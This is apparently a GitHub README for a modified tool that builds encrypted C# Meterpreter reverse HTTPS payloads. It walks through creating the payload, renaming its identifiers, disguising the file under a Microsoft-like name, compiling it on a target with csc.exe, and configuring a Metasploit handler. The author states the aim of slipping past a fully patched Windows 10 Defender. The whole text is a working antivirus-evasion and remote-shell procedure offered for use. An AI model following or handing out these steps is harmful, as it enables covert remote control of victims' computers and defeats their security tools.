# Modified_CsharpMMNiceness
modified https://github.com/fullmetalcache/CsharpMMNiceness to support msf5 options.

Great code by fullmetalcache. I added options to use msf5 encrypt and use custom SSL certs in https payloads.

example:
python mod_nice.py -a x64 -P https -l 127.0.0.1 -p 443 -e aes256 -k test123 -ssl msfkey.pem -s

These are my testing steps, I tested both staged and stageless https on a fully patched Windows 10 running Defender real-time and cloud-based protections all fully updated.

1. Set up cert (obviously you can use other certs but I did not test that):
After installing Letsencrypt you need to combine 2 keys to use for the reverse https payload, Letsencrypt stores them in /etc/letsencrypt/live/<yourdomain>/
cat privkey.pem cert.pem >> msfkey.pem
 
2. run the python script:
python mod_nice.py -a x64 -P https -l (listener address) -p 443 -e aes256 -k test123 -ssl /path/msfkey.pem -s
 
3. The script outputs a cs template called mmniceness.cs. Find and replace all function names and variables, etc. I also renamed it to sound like some Microsoft kind of thing, like msvct.cs.
 
4. Move msvct.cs to the Windows target (or precompile but I didn’t test that). 
C:\Windows\Microsoft.NET\Framework64\<whatever version>\csc.exe /unsafe /platform:x64 /out:C:\Windows\Temp\test\msvct.exe C:\Windows\Temp\test\msvct.cs
 
5. set up the handler, staged= windows/x64/meterpreter/reverse_https, stageless= windows/x64/meterpreter_reverse_https
enable https options:
set HANDLERSSLCERT /path/msfkey.pem
set stagerverifysslcert true (don't need this on stageless)
